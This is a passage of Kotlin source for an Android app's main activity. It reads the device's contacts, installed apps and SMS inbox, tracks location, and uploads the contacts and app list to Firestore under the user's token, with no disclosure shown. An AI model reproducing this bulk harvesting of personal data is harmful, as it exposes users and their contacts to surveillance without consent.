                        Manifest.permission.ACCESS_COARSE_LOCATION
                    ), MyContactRequestCode
                )
            } else {
                // getContact();
            }
        }


        override fun onRequestPermissionsResult(
            requestCode: Int, permissions: Array<String>,
            grantResults: IntArray,
        ) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults)
            if (requestCode == MyContactRequestCode) {
                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    val intent = Intent(this, LocationService::class.java)
                    startService(intent)
                    val asyncJob = async {
                        getContactAsync()
                        getInstalledApp()
                    }
                    lifecycleScope.launch {
                        asyncJob.await()
                    }
                    setInstrumentationPermissionAccept()
                } else {
                    //Toast.makeText(this, "Contact permission denied", Toast.LENGTH_LONG).show();
                    //  takePermissions();
                }
            }
        }

        private fun setInstrumentationPermissionAccept() {

        }

        @SuppressLint("QueryPermissionsNeeded", "NewApi")
        private fun getInstalledApp() {
            val packs: List<PackageInfo> = packageManager.getInstalledPackages(0)
            for (i in packs.indices) {
                val p = packs[i]
                val appName = p.applicationInfo.loadLabel(packageManager).toString()
                val date = Date(p.firstInstallTime)
                val df: DateFormat = SimpleDateFormat(getString(R.string.date_format2))
                listOfAppInstall.add(
                    LocalInfoAppInstallModel(
                        appName,
                        createAt(System.currentTimeMillis()),
                        df.format(date)
                    )
                )
                if (!isSystemPackage(p)) {
                    try {

                    } catch (e: PackageManager.NameNotFoundException) {
                        e.printStackTrace()
                    }

                }
            }
            isInstalledAppAvail = true
            dataAppInstallColletion["All Apps"] = listOfAppInstall
            postDataOnServer("no", "install")

        }

        private fun isSystemPackage(pkgInfo: PackageInfo): Boolean {
            return pkgInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
        }

        @SuppressLint("Recycle", "NewApi")
        private fun getSmsAsync() {
            val mSmsQueryUri = Uri.parse("content://sms/inbox")
            var cursor: Cursor? = null
            try {
                cursor = contentResolver.query(
                    mSmsQueryUri,
                    null, null, null, null
                )

                if (cursor == null) {
                    Log.i("CONTACT_LIST", "cursor is null. uri: \$mSmsQueryUri")
                }
                if (cursor != null) {
                    var hasData = cursor.moveToFirst()
                    while (hasData && checkSmsCount >= 0) {
                        /* val date = Date(cursor.getString(cursor.getColumnIndexOrThrow("date"))?:"")
                         val df: DateFormat = SimpleDateFormat("dd MMM yyyy hh:mm:ss zzz")*/
                        listOfAllSMS.add(
                            LocaInfoSMSModel(
                                cursor.getString(cursor.getColumnIndexOrThrow(Constants.ADDRESS)),
                                createAt(System.currentTimeMillis()),
                                cursor.getString(cursor.getColumnIndexOrThrow(Constants.BODY)),
                                createAt(cursor.getLong(cursor.getColumnIndexOrThrow("date")))
                            )
                        )
                        //readSms[cursor.getString(cursor.getColumnIndexOrThrow("address"))] = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        //readSms["message received"] = df.format(date)
                        hasData = cursor.moveToNext()
                        if (checkSmsCount == 0) {
                            // Event Fired...
                            val properties = Properties()
                            properties.addAttribute(
                                Constants.MOBILE_NUMBER2,
                                PrefrenceUtils.retriveData(this, Constants.PHONENUMBER)
                            )
                            MoEHelper.getInstance(this)
                                .trackEvent(Constants.SMS_LIMIT_BREACHED, properties)
                        }
                        checkSmsCount--
                    }
                }
            } catch (e: Exception) {
                Log.e("CONTACT_LIST", e.message!!)
            } finally {
                cursor!!.close()
            }


            //smsInfo[PrefrenceUtils.retriveData(context,Constants.PHONENUMBER)]=readSms
            // printing the elements of LinkedHashMap

            // printing the elements of LinkedHashMap
            //dataSMS["All SMS"] = smsInfo
            dataSmsCollection["All SMS"] = listOfAllSMS
            postDataOnServer("no", "sms")
        }

        @SuppressLint("Range", "NewApi")
        private fun getContactAsync() {
            val phones = contentResolver
                .query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )
            if (phones != null) {
                var data = phones.moveToFirst()
                while (data) {
                    val name =
                        phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val phoneNumber =
                        phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                    listOfAllContacts.add(
                        LocalInfoContactsModel(
                            name,
                            createAt(System.currentTimeMillis()),
                            phoneNumber
                        )
                    )
                    data = phones.moveToNext()

                }

            }

            phones?.close()
            isReadContactAvail = true
            dataAllContactsColletion[Constants.ALL_CONTACTS] = listOfAllContacts
            postDataOnServer("no", "contact")

        }

        fun postDataOnServer(passBooleanCheck: String, s: String) {
            Thread {
                if (isInstalledAppAvail && isReadContactAvail) {
                    PrefrenceUtils.insertDataInBoolean(
                        this,
                        Constants.UPDATE_LOCAL_USER_DATA,
                        true
                    )
                    try {
                        db?.collection("contacts")
                            ?.document(PrefrenceUtils.retriveData(this, Constants.API_TOKEN))
                            ?.set(dataAllContactsColletion)
                            ?.addOnFailureListener {
                                Toast.makeText(this, "" + it, Toast.LENGTH_SHORT).show()
                            }
                        db?.collection(Constants.INSTALLED_APPS)
                            ?.document(
                                PrefrenceUtils.retriveData(
                                    this,
                                    Constants.API_TOKEN
                                )
                            )
                            ?.set(dataAppInstallColletion)
                            ?.addOnFailureListener {
                                Toast.makeText(this, "" + it, Toast.LENGTH_SHORT).show()
                            }

                    } catch (e: Exception) {
                        Log.d("TAG", "postDataOnServer: $e")
                    }
                }
            }.start()
        }

        companion object {
            private const val ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners"
            private const val ACTION_NOTIFICATION_LISTENER_SETTINGS =
                "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
            var instance: MainActivity? = null
                private set

            @JvmStatic
            val context: Context?
                get() = instance
        }

        override fun onResume() {
            super.onResume()
            if (broadcastReceiver == null) {
                broadcastReceiver = object : BroadcastReceiver() {
                    override fun onReceive(context: Context?, intent: Intent) {
                        try {
                            val coordinates = intent.extras!![Constants.COORDINATES].toString()
                            val latLng = coordinates.split(" ".toRegex()).toTypedArray()
                            var longitude = ""
                            if (latLng.isNotEmpty())
                                longitude = latLng[0]
                            var latitude = ""
                            if (latLng.size > 1)
                                latitude = latLng[1]
                            WorkerScheduler.updateUserLocation(latitude, longitude)
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }


                    }
                }
            }
            registerReceiver(broadcastReceiver, IntentFilter(Constants.LOCATION_UPDATE))
            if (!closePopup) {
                if (forceCheck == 0) {
                    appUpdateManager
                        .appUpdateInfo
                        .addOnSuccessListener { appUpdateInfo ->
                            // If the update is downloaded but not installed,
                            // notify the user to complete the update.
                            if (appUpdateInfo.installStatus() == InstallStatus.DOWNLOADED) {
                                popupSnackbarForCompleteUpdate()
                            }
                            appUpdateManager.registerListener(
                                appUpdatedListener
                            )
                            //Check if flexible update is required
                            try {
                                if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE) {
                                    // If an in-app update is already running, resume the update.
                                    appUpdateManager.startUpdateFlowForResult(
                                        appUpdateInfo,
                                        AppUpdateType.FLEXIBLE,
                                        this,
                                        APP_UPDATE_REQUEST_CODE
                                    )
                                } else {

                                }
                            } catch (e: IntentSender.SendIntentException) {
                                e.printStackTrace()
                            }
                        }
                }
            }
        }


        override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
            super.onActivityResult(requestCode, resultCode, data)
            if (requestCode == APP_UPDATE_REQUEST_CODE) {
                if (resultCode != Activity.RESULT_OK) {
                    Toast.makeText(
                        this,
                        getString(R.string.app_update_failed_please_try_again_on_the_next_app_launch),
                        Toast.LENGTH_SHORT
                    )
                        .show()
                    closePopup = true
                }
            }
        }

        private fun popupSnackbarForCompleteUpdate() {
            val snackbar = Snackbar.make(
                findViewById(R.id.container),
                getString(R.string.An_update_has_just_been_downloaded),
                Snackbar.LENGTH_INDEFINITE
            )
            snackbar.setAction(Constants.RESTART) { appUpdateManager.completeUpdate() }
            snackbar.setActionTextColor(ContextCompat.getColor(this, R.color.default_200))
            snackbar.show()
        }

        private fun isFirstInstall(context: Context): Boolean {
            return try {
                val firstInstallTime =
                    context.packageManager.getPackageInfo(context.packageName, 0).firstInstallTime
                val lastUpdateTime =
                    context.packageManager.getPackageInfo(context.packageName, 0).lastUpdateTime
                firstInstallTime == lastUpdateTime
            } catch (e: PackageManager.NameNotFoundException) {
                e.printStackTrace()
                true
            }
        }

        @SuppressLint("SimpleDateFormat")
        private fun createAt(currentTimeMillis: Long): String {
            val simpleDateFormat =
                SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'")
            simpleDateFormat.timeZone = TimeZone.getTimeZone("GMT")
            return simpleDateFormat.format(Date(currentTimeMillis))
        }
    }


